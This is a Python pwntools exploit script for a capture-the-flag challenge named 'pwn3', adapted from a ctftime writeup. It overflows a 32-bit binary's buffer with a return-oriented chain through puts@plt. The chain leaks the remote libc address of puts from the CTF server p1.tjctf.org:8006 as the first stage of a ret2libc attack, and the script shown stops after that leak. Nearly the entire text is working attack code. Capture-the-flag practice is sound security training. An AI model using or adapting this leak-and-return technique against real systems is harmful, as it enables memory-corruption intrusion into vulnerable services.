# All credit for this script goes to https://ctftime.org/writeup/14404. 
# I just modified it slightly to work for this challenge

import struct
import socket
from pwn import *


########################## [REMOTE EXPLOIT] by M4ST3R3K ##########################
                                  ###[PWN3]###



context(arch = 'i386', os = 'linux', endian = 'little')


#################### STAGE1 ####################

puts_plt = 0x80483f0         #objdump -D pwn3 | grep puts
puts_got = 0x8049e80         #objdump -R pwn3 | grep puts
main = 0x8048546             #objdump -D pwn3 | grep main


buf = b""
buf += b"A"*256 + b"BBBBCCCCDDDDEEEE"                   #junk
buf += p32(puts_plt)          #plt entry of puts
buf += p32(main)               #return to main
buf += p32(puts_got)         #got entry of puts


s = remote('p1.tjctf.org', 8006)

log.info("Stage 1: ...Leaking Memory")

print('')

print(s.recvline())

s.sendline(buf)

print(s.recvline())

received = s.recvline()

print(received)

leaked_puts_got = received[:4].strip().ljust(4, b'\x00')

leaked_puts_got = u32(leaked_puts_got)

addrs = hex(leaked_puts_got)

leaked_puts_got = int(addrs, 16)

log.success("Leaked remote libc address: " + addrs)

print('')
